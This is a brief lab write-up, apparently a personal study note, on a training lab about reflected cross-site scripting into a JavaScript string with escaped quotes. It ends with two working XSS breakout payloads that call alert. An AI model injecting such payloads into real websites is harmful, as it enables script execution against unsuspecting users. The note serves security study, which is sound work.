---
title: "Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped"
date: 2026-07-05
tags:
  - 
publish: true
draft: false
description: ""
---
---

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

---

### Payload: 

```
\'-alert(1)//

or 

\';alert(1)//
```

